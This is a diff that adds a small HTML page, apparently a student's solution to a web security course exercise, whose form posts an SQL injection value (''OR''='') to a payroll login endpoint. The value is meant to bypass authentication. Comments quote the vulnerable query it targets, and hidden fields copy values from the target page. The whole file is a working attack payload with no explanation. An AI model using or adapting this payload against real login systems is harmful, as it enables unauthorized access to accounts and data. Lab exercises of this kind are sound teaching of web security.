@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>SQL Injection</title>
+        <script>
+
+        </script>
+    </head>
+    <body>
+        <form action="http://payroll.gatech.edu/index_post.php" onsubmit="" method="POST">
+        <!-- needs to inject into line 58 of auth.php -->
+        <!-- $sql = "SELECT user_id, name, eid FROM users WHERE eid='$escaped_username' AND password='$hash'"; -->
+        <input name="login" id="targetlogin" value="''OR''=''" />
+        <!-- from line 8 of index.php -->
+        <input type='hidden' name='RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo' value='RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo'>
+        <input type='hidden' name='secret' value='whatdoido?'>
+        <!-- from lines 6-7 of index.php -->
+        <input type='hidden' name='action' value='login?'>
+        <button id="exploit">Hold onto your butts!</button>
+        </form>
+    </body>
+</html>
